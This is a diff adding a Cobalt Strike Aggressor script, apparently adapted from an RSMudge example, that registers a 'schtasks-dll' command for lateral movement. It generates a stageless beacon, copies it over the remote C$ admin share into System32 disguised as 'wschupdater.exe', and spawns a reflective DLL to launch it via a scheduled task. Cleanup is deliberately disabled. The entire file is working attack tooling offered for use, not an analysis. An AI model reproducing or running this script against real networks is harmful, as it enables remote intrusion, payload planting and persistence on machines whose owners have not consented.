@@ -1,0 +1,89 @@
+#Pulling from Comexec Lateral Movement Aggressor Script Developed by RSMudge
+#https://gist.github.com/rsmudge/8b2f699ea212c09201a5cb65650c6fa2
+
+beacon_command_register("schtasks-dll", "Custom schtasks reflective DLL", "Usage: schtasks-dll [Target IP] [Listener]");
+
+alias schtasks-dll {
+
+	if($2 is $null)
+	{
+		blog($1, "No parameters entered");
+		blog($1, "Usage: schtasks-dll [Target IP] [Listener]");
+		exit("Done");
+	}
+
+	if($2 !hasmatch '\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}')
+	{
+		blog($1, "Use an IP Address");
+		blog($1, "Usage: schtasks-dll [Target IP] [Listener]");
+		exit("Done");
+	}
+	
+	if($3 is $null)
+	{
+		openPayloadHelper(lambda({
+			schtasks-dll-go($bid, $target, $1);
+		}, $bid => $1, $target => $2));
+	}
+	else
+	{
+		schtasks-dll-go($1, $2, $3)
+	}
+}
+
+sub schtasks-dll-go {
+	local('$bid $target $listener $handle');
+	$bid = $1;
+	$target = $2;
+	$listener = $3;
+	$arch = "x86";
+	$dll = getFileProper(script_resource("dll"), "schtasks-dll.dll");
+
+	if (listener_info($3) is $null) {
+		berror($1, "Listener $3 does not exist");
+		return;
+	}
+	
+	btask($1, "Tasked beacon to spin up $2 (" . listener_describe($3, $2) . ") via schtasks-dll");
+	
+	
+	artifact_stageless($3, "exe", $arch, $null, $this);
+	yield;
+
+	$payload = $1;
+
+	if($target ismatch '127\.0\.0\.1')
+	{
+		$filepath = "C:\\Windows\\System32";
+	}
+	else
+	{
+		$filepath = "\\\\$target\\C$\\Windows\\System32";
+	}
+
+	##
+	#Is there a better way? Raffi save me!
+	##
+	bls($bid, $filepath, lambda({
+			if($3 hasmatch 'wschupdater')
+			{
+				println("File already exists, skipping upload");
+			}
+			else
+			{
+				$uploadpath = "$filepath\\wschupdater.exe";
+				bupload_raw!($bid, $uploadpath, $payload);		
+			}
+		}, $callback => $3, $filepath => $filepath, $bid => $bid, $payload => $payload)
+	);
+	
+
+	bdllspawn!($bid, $dll, $target, "schtasks via dll", 6000);
+	bstage!($bid, $target, $listener, $arch);
+
+	#brm is disabled, use cmd.exe /c in the reflective DLL to delete after or manually remove wschupdater.exe when done
+	#brm($bid, $uploadpath);
+	exit("Done");
+}
+
+
